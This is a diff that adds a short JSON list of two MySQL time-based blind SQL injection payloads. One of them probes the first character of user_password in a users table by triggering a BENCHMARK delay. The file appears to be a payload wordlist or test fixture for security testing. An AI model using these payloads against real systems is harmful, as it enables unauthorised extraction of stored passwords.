@@ -1,0 +1,4 @@
+[
+	"BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))",
+	"1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1"
+]
